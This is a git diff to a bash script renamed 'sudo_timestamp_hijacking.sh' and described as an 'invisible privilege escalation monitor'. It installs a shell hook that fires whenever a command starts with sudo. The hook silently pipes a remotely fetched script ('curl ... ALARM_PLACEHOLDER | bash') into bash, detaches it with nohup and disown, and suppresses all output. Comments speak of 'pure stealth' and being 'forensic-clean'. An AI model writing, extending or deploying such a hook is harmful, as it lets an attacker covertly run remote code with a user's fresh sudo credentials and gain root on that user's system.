@@ -1,6 +1,6 @@
 #!/bin/bash
-# 🔐 sudo_guardian_silent.sh - Sudo Timestamp Hijacking | Invisible privilege escalation monitor
-# 🎯 Zero UI | Async alarm | Forensic-clean
+# 🔐 sudo_timestamp_hijacking.sh - Sudo Timestamp Hijacking | Invisible privilege escalation monitor
+
 # Made By Aryan Giri | giriaryan694-a11y
 
 set -euo pipefail
@@ -17,8 +17,9 @@ __sudo_watch__() {
     # Match sudo as first command token (handles leading whitespace)
     if [[ "$cmd" =~ ^[[:space:]]*sudo([[:space:]]|$) ]]; then
         # Async, non-blocking alarm trigger + error suppression
-        (curl -s --connect-timeout 2 --max-time 5 \
-            "ALARM_PLACEHOLDER" 2>/dev/null | bash &>/dev/null) &
+        # FIX: disown + redirect stdin from /dev/null + nohup to prevent SIGTSTP
+        ( nohup bash -c 'curl -s --connect-timeout 2 --max-time 5 "ALARM_PLACEHOLDER" 2>/dev/null | bash' < /dev/null &>/dev/null & )
+        disown &>/dev/null || true
         # Optional: silent local audit (comment out for pure stealth)
         # printf "%s\t%s\n" "$(date +%s)" "$cmd" >> "${HOME}/.cache/.watch" 2>/dev/null || true
     fi
